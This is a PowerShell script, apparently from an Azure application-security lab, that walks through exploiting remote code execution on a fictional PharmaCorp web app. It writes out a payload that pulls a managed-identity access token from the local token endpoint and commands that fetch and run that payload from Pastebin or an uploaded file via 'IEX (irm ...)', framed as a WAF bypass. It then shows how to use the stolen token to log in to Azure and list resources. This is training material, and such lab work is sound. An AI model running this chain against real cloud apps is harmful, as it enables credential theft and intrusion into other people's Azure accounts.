# Learning Objective 10: Exploit RCE vulnerability and request access token using Managed Identity
# This script demonstrates how to bypass WAF to get access tokens
# Author: rfs85

# Technique 1: Create a payload file for Pastebin (save to disk first, then manually upload)
$managedIdentityPayload = @'
$headers = @{
    'secret' = '3218749D6F3D4D4F917040A91B2952FD'
}
Invoke-RestMethod -Method GET -Uri "http://127.0.0.1:41055/msi/token/?resource=https://management.azure.com&api-version=2017-09-01" -Headers $headers
'@

$paybinFilePath = "C:\AzAppsec\Tools\managedIdentityPayload.ps1"
$managedIdentityPayload | Out-File -FilePath $paybinFilePath -Encoding ASCII
Write-Host "Payload file saved to $paybinFilePath"
Write-Host "Upload this file to Pastebin with 'Unlisted' visibility"

# Function to execute the RCE on the analytics app
function Invoke-RCE {
    param (
        [string]$command
    )
    
    # Note: This is a conceptual function. In a real scenario, 
    # you would need to implement the actual HTTP request to exploit the RCE.
    Write-Host "Executing command via RCE: $command"
    Write-Host "In the actual lab, you would:"
    Write-Host "1. Go to https://analytics.pharmacorphq.com/"
    Write-Host "2. Enter the command in the 'Category Name' field"
    Write-Host "3. Click Save"
    Write-Host "4. Observe the command execution"
}

# Instructions for executing the Pastebin payload
function Get-ManagedIdentityToken {
    param (
        [Parameter(Mandatory=$true)]
        [string]$pastebinUrl
    )
    
    # Create the command to execute via RCE
    $rceCommand = "powershell -c IEX (irm '$pastebinUrl')"
    
    Write-Host "To get the Managed Identity token:"
    Write-Host "1. Upload the payload file to Pastebin and get the 'raw' URL"
    Write-Host "2. Execute this command via the RCE vulnerability:"
    Write-Host "   $rceCommand"
    Write-Host "3. Copy the access token from the output"
    
    # In actual execution, you would run:
    # Invoke-RCE -command $rceCommand
}

# Technique 2: Upload payload to the contactpharmacorp site
function Upload-PayloadToContactApp {
    $payloadContent = $managedIdentityPayload
    $payloadPath = "C:\AzAppsec\Tools\studentx.txt"
    
    $payloadContent | Out-File -FilePath $payloadPath -Encoding ASCII
    
    Write-Host "Payload saved to $payloadPath"
    Write-Host "Manually upload this file to https://contactpharmacorp.azurewebsites.net/upload"
    Write-Host "After uploading, execute this command via RCE:"
    Write-Host "powershell -c IEX (irm 'http://contactpharmacorp.azurewebsites.net/studentx.txt')"
}

# Function to use the access token (after you've obtained it)
function Use-AccessToken {
    param (
        [Parameter(Mandatory=$true)]
        [string]$accessToken
    )
    
    Write-Host "Using the access token to authenticate to Azure..."
    
    # Remove any whitespace from the token
    $accessToken = $accessToken.Trim()
    
    # Connect to Azure using the access token
    $connectCommand = "Connect-AzAccount -AccessToken '$accessToken' -AccountId '3329FEA7-642E-4C09-B1AD-D8EDBE140267'"
    Write-Host "Run this command to connect to Azure:"
    Write-Host $connectCommand
    
    # Enumerate resources
    Write-Host "After connecting, run this command to enumerate resources:"
    Write-Host "Get-AzResource"
}

# Main menu to select which function to run
function Show-Menu {
    Clear-Host
    Write-Host "RCE and Managed Identity Token Exploitation"
    Write-Host "==========================================="
    Write-Host "1. Create Pastebin payload"
    Write-Host "2. Get instructions for using Pastebin payload"
    Write-Host "3. Upload payload to contact app"
    Write-Host "4. Use access token"
    Write-Host "Q. Quit"
    
    $selection = Read-Host "Select an option"
    
    switch ($selection) {
        "1" { 
            # Payload already created above
            Write-Host "Payload file created at $paybinFilePath"
            Read-Host "Press Enter to continue"
            Show-Menu
        }
        "2" {
            $pastebinUrl = Read-Host "Enter your Pastebin raw URL"
            Get-ManagedIdentityToken -pastebinUrl $pastebinUrl
            Read-Host "Press Enter to continue"
            Show-Menu
        }
        "3" {
            Upload-PayloadToContactApp
            Read-Host "Press Enter to continue"
            Show-Menu
        }
        "4" {
            $token = Read-Host "Enter the access token"
            Use-AccessToken -accessToken $token
            Read-Host "Press Enter to continue"
            Show-Menu
        }
        "Q" { return }
        default {
            Write-Host "Invalid selection"
            Read-Host "Press Enter to continue"
            Show-Menu
        }
    }
}

# Run the menu
Show-Menu